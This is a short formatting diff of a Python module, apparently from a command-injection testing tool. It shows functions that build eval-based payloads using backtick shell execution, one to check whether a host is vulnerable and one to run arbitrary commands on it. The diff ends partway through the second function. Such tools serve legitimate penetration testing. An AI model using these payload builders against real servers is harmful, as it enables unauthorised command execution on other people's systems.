@@ -19,9 +19,10 @@
   The available "eval-based" payloads.
 """
 
+# -----------------------------------------------------------
 # Eval-based decision payload (check if host is vulnerable).
+# -----------------------------------------------------------
 def decision(separator, TAG, randv1, randv2):
-
   if separator == "":
     payload = ("print(`echo " + TAG + "`." +
                 "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
@@ -29,7 +30,6 @@ def decision(separator, TAG, randv1, randv2):
                 "`echo " + TAG + "`)%3B" +
                 separator
               )
-    
   else:
     payload = ("print(`echo " + TAG + "" +
                 separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
@@ -38,9 +38,11 @@ def decision(separator, TAG, randv1, randv2):
               )
   return payload
 
+
+# ---------------------------------------------
 # Execute shell commands on vulnerable host.
+# ---------------------------------------------
 def cmd_execution(separator, TAG, cmd):
-  
   if separator == "":
     payload = ("print(`echo " + TAG + "`." + 
                 "`echo " + TAG + "`." +
